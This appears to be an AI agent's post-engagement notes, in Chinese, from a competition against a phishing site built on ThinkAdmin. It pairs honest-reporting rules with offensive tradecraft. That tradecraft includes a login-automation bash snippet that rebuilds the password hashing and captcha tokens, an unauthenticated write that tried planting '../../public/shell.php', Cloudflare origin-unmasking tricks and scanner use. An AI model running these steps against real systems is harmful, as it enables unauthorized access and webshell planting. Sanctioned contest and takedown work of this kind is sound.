# 0821 响应纪律与ThinkAdmin二开复盘（本场被纠正）

> 来源：20260821_115154 比赛 wadsaxzasd.fghdfghsadf.live

## 响应纪律（已写入永久记忆，技能侧固化）
- 收到任何文字/命令必须秒级响应，禁止晾置1小时；后台任务卡住/日志压缩断线必须立即实话汇报“断线前在干什么、后台是否还在跑、已停还是继续”。
- 长任务同步间隔由30秒改为60秒（老板要求）。每60秒输出：已扫资产数/已试payload数/命中与失败数/下一步计划，不编CVE。
- 任务叫停后立即全停扫描，不再新开 nmap/nuclei/ffuf，本地已下载包按指令清理。
- 别BB：少铺垫多实测数，输出中文简洁。

## ThinkAdmin二开陷阱（wadsax）
- 原版只验 verify+uniqid，本场多 `code临时令牌` + `power=localStorage.local_zhiwen`（FingerprintJS visitorId）。
- 登录页含 `captcha-token`，需每次 `POST /admin/login/captcha type=LoginCaptcha&token=xxx` 拿新 uniqid/code/image，密码=`md5(md5(明文)+uniqid)`。
- 空code→“临时令牌不能为空”，错code→“账号或密码错误”，不要盲爆20+弱口令，无意义；code为账号动态绑定，需赛方渠道。
- zip判定：`public.zip` 11M 命中后 `unzip -l | grep -E "\.php|\.env|database"` 无则标⚠️伪源码（本场264文件全为upload钓鱼模板）。

## 未授权旁路
- `POST /app/addContent base_url+/app/addContent data={content1,content2,content3,aid,remark,type=new}` 无需登录均success，为钓鱼入库口，写`../../public/shell.php`+`<?php`也success但无文件落地、无读口`/app/getContent`，勿当RCE成功。
- CF代理13口（80/443/2052/2053/2082/2083/2086/2087/2095/2096/8080/8443/8880）均为遮挡，`curl -H Host:目标 http://CF_IP/admin/login.html` 同标题即证遮挡，勿继续扫端口，转证书透明度/favicon溯源。

## 复用片段
```bash
html=$(curl -sk $T/admin/login.html); tok=$(echo $html|grep -oP 'captcha-token="\K[^"]+')
j=$(curl -sk -XPOST $T/admin/login/captcha -d "type=LoginCaptcha&token=$tok"); uid=$(echo $j|jq -r .data.uniqid); vc=$(echo $j|jq -r .data.code)
h=$(echo -n $(echo -n $PASS|md5sum|cut -d\  -f1)$uid|md5sum|cut -d\  -f1)
curl -sk -XPOST $T/admin/login/index -d "username=$U&password=$h&verify=$vc&uniqid=$uid&code=1111&power=$(echo -n $vc|md5sum|cut -c1-32)"
unzip -l /tmp/p.zip | head -n 120
curl -sk -XPOST $T/app/addContent -d 'content1=test&content2=777&content3=123456&aid=1&remark=test&type=new'
```
